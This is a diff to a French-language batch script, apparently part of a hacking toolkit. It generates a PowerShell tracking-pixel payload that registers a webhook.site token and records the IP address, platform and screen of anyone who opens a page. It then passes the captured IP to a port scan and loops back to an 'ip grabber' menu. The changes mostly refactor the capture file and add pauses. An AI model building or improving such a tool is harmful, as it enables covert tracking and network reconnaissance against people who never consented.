@@ -1829,7 +1829,9 @@ echo      Son IP est captee des l'ouverture de la page.
 echo.
 echo  [i] Generation du token webhook.site...
 set "PS_HTML=%TEMP%\pixel_%RANDOM%.ps1"
+set "CAPFILE=%TEMP%\captured_ip.txt"
 >> "%PS_HTML%" echo $Host.UI.RawUI.FlushInputBuffer()
+>> "%PS_HTML%" echo $capFile = "%CAPFILE%"
 >> "%PS_HTML%" echo try {
 >> "%PS_HTML%" echo   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 >> "%PS_HTML%" echo   $tk = Invoke-RestMethod -Method Post 'https://webhook.site/token' -TimeoutSec 10 -EA Stop
@@ -1860,7 +1862,6 @@ set "PS_HTML=%TEMP%\pixel_%RANDOM%.ps1"
 >> "%PS_HTML%" echo         Write-Host ("  Plateforme : " + (if ($segs.Count -ge 2) { $segs[-2] } else { '?' })) -f White
 >> "%PS_HTML%" echo         Write-Host ("  Ecran      : " + (if ($segs.Count -ge 1) { $segs[-1] } else { '?' })) -f White
 >> "%PS_HTML%" echo         Write-Host '  =================================================' -f Red
->> "%PS_HTML%" echo         Set-Content "$env:TEMP\captured_ip.txt" -Value "$ip_val;HTML;pixel" -Encoding ASCII
 >> "%PS_HTML%" echo       }
 >> "%PS_HTML%" echo     } catch {}
 >> "%PS_HTML%" echo     if (-not $found) {
@@ -1875,14 +1876,17 @@ set "PS_HTML=%TEMP%\pixel_%RANDOM%.ps1"
 >> "%PS_HTML%" echo     }
 >> "%PS_HTML%" echo   }
 >> "%PS_HTML%" echo   if (Test-Path $desk) { Remove-Item $desk -Force -EA SilentlyContinue }
->> "%PS_HTML%" echo   if ($found) { Write-Host '  [-^>] IP capturee ! Lancement du scan...' -f Green }
+>> "%PS_HTML%" echo   if ($found) {
+>> "%PS_HTML%" echo     Set-Content $capFile -Value "$ip_val;HTML;pixel" -Encoding ASCII
+>> "%PS_HTML%" echo     Write-Host '  [-^>] IP capturee ! Lancement du scan...' -f Green
+>> "%PS_HTML%" echo   }
 >> "%PS_HTML%" echo } catch { Write-Host "  [ERREUR] $($_.Exception.Message)" -f Red }
 powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_HTML%"
 if exist "%PS_HTML%" del /f /q "%PS_HTML%"
-if exist "%TEMP%\captured_ip.txt" (
-    set /p capture_data=<"%TEMP%\captured_ip.txt"
+if exist "%CAPFILE%" (
+    set /p capture_data=<"%CAPFILE%"
     for /f "tokens=1 delims=;" %%a in ("!capture_data!") do set "remote_ip=%%a"
-    del /f /q "%TEMP%\captured_ip.txt"
+    del /f /q "%CAPFILE%"
     if defined remote_ip (
         set "remote_pc=HTML-Tracker"
 chcp 65001 >nul
@@ -2602,8 +2606,16 @@ set /p found_ports=<"%WPORTS%"
 if exist "%WPORTS%" del /f /q "%WPORTS%"
 
 echo.
-if "!found_ports!"=="NONE" goto cyber_ip_grabber
-if not defined found_ports goto cyber_ip_grabber
+if "!found_ports!"=="NONE" (
+    echo  [i] Appuyez sur une touche pour continuer...
+    pause >nul
+    goto cyber_ip_grabber
+)
+if not defined found_ports (
+    echo  [!] Aucun resultat - Appuyez sur une touche pour continuer...
+    pause >nul
+    goto cyber_ip_grabber
+)
 
 :wan_post_scan
 set "fwd_opts=Retour"
